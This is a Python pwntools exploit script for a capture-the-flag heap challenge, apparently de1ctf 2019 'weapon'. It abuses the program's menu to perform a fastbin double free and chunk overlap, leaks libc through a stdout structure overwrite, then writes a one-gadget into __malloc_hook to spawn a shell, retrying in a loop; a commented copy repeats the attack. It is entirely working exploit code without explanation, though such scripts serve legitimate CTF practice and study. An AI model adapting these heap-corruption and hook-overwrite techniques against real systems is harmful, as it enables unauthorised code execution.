from pwn import *
import functools

LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.update(arch='amd64', os='linux', endian='little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_34_de1ctf_2019_weapon')
libc = elf.libc

def create_weapon(size:int, idx:int, name, sh:tube):
    sh.sendlineafter("choice >> \n", '1')
    sh.sendlineafter("wlecome input your size of weapon: ", str(size))
    sh.sendlineafter("input index: ", str(idx))
    sh.sendafter("input your name:\n", name)


def delete_weapon(idx, sh:tube):
    sh.sendlineafter("choice >> \n", '2')
    sh.sendlineafter("input idx :", str(idx))


def rename_weapon(idx, name, sh:tube):
    sh.sendlineafter("choice >> \n", '3')
    sh.sendlineafter("input idx: ", str(idx))
    sh.sendafter("new content:\n", name)


def attack(
        malloc_hook_offset = libc.sym.__malloc_hook, 
        gadget = 0x4527a, 
        realloc_offset = libc.sym.realloc, 
        low_2th_byte=b'\xe5', 
        sh:tube=None
    ):
    create_weapon(0x60, 0, p64(0x71) * 10 + p64(0) + p64(0x71), sh)
    create_weapon(0x60, 1, p64(0x71) * 12, sh)
    create_weapon(0x60, 2, p64(0x51) * 12, sh)

    delete_weapon(0, sh)
    delete_weapon(1, sh)
    delete_weapon(0, sh)

    create_weapon(0x60, 3, b'\x50', sh)
    create_weapon(0x60, 3, b'\x50', sh)
    create_weapon(0x60, 3, b'\x50', sh)

    create_weapon(0x60, 4, 'a', sh)
    delete_weapon(1, sh)

    rename_weapon(4, p64(0x71) * 3 + p64(0x91), sh)
    delete_weapon(1, sh)

    rename_weapon(4, p64(0x71) * 3 + p64(0x71) + b'\xdd' + low_2th_byte, sh)

    create_weapon(0x60, 3, b'\x00', sh)

    create_weapon(0x60, 5, 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58', sh)

    leak_libc_addr = u64(sh.recvn(8))
    LOG_ADDR('leak_libc_addr', leak_libc_addr)
    libc_base_addr = leak_libc_addr -  0x3c56a3
    LOG_ADDR('libc_base_addr', libc_base_addr)

    delete_weapon(1, sh)
    rename_weapon(4, p64(0x71) * 3 + p64(0x71) + p64(libc_base_addr + malloc_hook_offset - 0x23), sh)
    create_weapon(0x60, 3, 'a', sh)
    create_weapon(0x60, 3, 0xb * b'a' + p64(libc_base_addr + gadget) + p64(libc_base_addr + realloc_offset + 0xd), sh)

    sh.sendlineafter("choice >> \n", '1')
    sh.sendlineafter("wlecome input your size of weapon: ", str(64))
    sh.sendlineafter("input index: ", str(0))

    sh.sendline('id')
    sh.recvline_contains(b'uid', timeout=1)
    sh.interactive()

if __name__ == '__main__':
    sh = None
    while True:
        try:
            #sh = remote('node3.buuoj.cn', 25668)
            sh = process('./data/bin/heap23_34_de1ctf_2019_weapon')
            attack(realloc_offset=0x846c0, gadget=0x4527a, sh=sh)
        except:
            try:
                sh.close()
            except:
                pass

'''
sh = process('./data/bin/heap23_34_de1ctf_2019_weapon')
malloc_hook_offset = libc.sym.__malloc_hook
gadget = 0x4527a
realloc_offset = libc.sym.realloc
low_2th_byte=b'\xe5'

create_weapon(0x60, 0, p64(0x71) * 10 + p64(0) + p64(0x71), sh)
create_weapon(0x60, 1, p64(0x71) * 12, sh)
create_weapon(0x60, 2, p64(0x51) * 12, sh)

delete_weapon(0, sh)
delete_weapon(1, sh)
delete_weapon(0, sh)

create_weapon(0x60, 3, b'\x50', sh)
create_weapon(0x60, 3, b'\x50', sh)
create_weapon(0x60, 3, b'\x50', sh)

create_weapon(0x60, 4, 'a', sh)
delete_weapon(1, sh)

rename_weapon(4, p64(0x71) * 3 + p64(0x91), sh)
delete_weapon(1, sh)

rename_weapon(4, p64(0x71) * 3 + p64(0x71) + b'\xdd' + low_2th_byte, sh)

create_weapon(0x60, 3, b'\x00', sh)

create_weapon(0x60, 5, 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58', sh)

leak_libc_addr = u64(sh.recvn(8))
LOG_ADDR('leak_libc_addr', leak_libc_addr)
libc_base_addr = leak_libc_addr -  0x3c56a3
LOG_ADDR('libc_base_addr', libc_base_addr)

delete_weapon(1, sh)
rename_weapon(4, p64(0x71) * 3 + p64(0x71) + p64(libc_base_addr + malloc_hook_offset - 0x23), sh)
create_weapon(0x60, 3, 'a', sh)
create_weapon(0x60, 3, 0xb * b'a' + p64(libc_base_addr + gadget) + p64(libc_base_addr + realloc_offset + 0xd), sh)

sh.sendlineafter("choice >> \n", '1')
sh.sendlineafter("wlecome input your size of weapon: ", str(64))
sh.sendlineafter("input index: ", str(0))

sh.sendline('id')
sh.recvline_contains(b'uid', timeout=1)
sh.interactive()
'''